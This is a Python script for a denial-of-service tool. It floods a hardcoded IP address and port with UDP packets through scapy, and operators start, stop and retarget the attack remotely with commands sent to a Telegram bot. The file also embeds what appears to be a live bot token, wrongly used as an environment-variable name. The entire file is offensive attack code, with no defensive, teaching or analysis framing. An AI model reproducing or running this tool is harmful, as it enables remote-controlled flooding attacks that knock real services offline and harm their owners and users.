import requests
from scapy.all import *
from threading import Thread
import time
import os

class DDoSAttack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.running = False

    def start_attack(self):
        self.running = True
        while self.running:
            send(IP(dst=self.ip)/UDP(dport=self.port), count=1000)

    def stop_attack(self):
        self.running = False

    def change_target(self, new_ip, new_port):
        self.ip = new_ip
        self.port = new_port

def telegram_bot_start():
    bot_api_key = os.environ["8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko"]
    bot_url = f"https://api.telegram.org/bot{bot_api_key}/"

    # Handle commands
    def get_commands():
        response = requests.get(bot_url + "getUpdates")
        return response.json()["result"]

    def send_message(chat_id, message):
        requests.get(bot_url + f"sendMessage?chat_id={chat_id}&text={message}")

    last_update_id = 0
    while True:
        commands = get_commands()
        for command in commands:
            if command["update_id"] > last_update_id:
                last_update_id = command["update_id"]
                chat_id = command["message"]["chat"]["id"]
                command_text = command["message"]["text"].split()
                if command_text[0] == "/start":
                    send_message(chat_id, "DDoS Bot started. Type /help for commands.")
                    time.sleep(1)  # Delay between sending messages
                elif command_text[0] == "/help":
                    send_message(chat_id, "Available commands: /start, /attack, /stop, /change")
                    time.sleep(1)  # Delay between sending messages
                elif command_text[0] == "/attack":
                    ddos_attack.start_attack()
                    send_message(chat_id, "Attack started.")
                    time.sleep(1)  # Delay between sending messages
                elif command_text[0] == "/stop":
                    ddos_attack.stop_attack()
                    send_message(chat_id, "Attack stopped.")
                    time.sleep(1)  # Delay between sending messages
                elif command_text[0] == "/change":
                    try:
                        new_ip = command_text[1]
                        new_port = int(command_text[2])
                        ddos_attack.change_target(new_ip, new_port)
                        send_message(chat_id, f"Target changed to {new_ip}:{new_port}")
                        time.sleep(1)  # Delay between sending messages
                    except (IndexError, ValueError):
                        send_message(chat_id, "Invalid command. Use /change <new_ip> <new_port>")
                        time.sleep(1)  # Delay between sending messages
        time.sleep(1)  # Delay between checking for new messages

if __name__ == "__main__":
    ip = "20.219.163.225"
    port = 15190
    ddos_attack = DDoSAttack(ip, port)

    telegram_bot_thread = Thread(target=telegram_bot_start)
    telegram_bot_thread.start()

    while True:
        pass
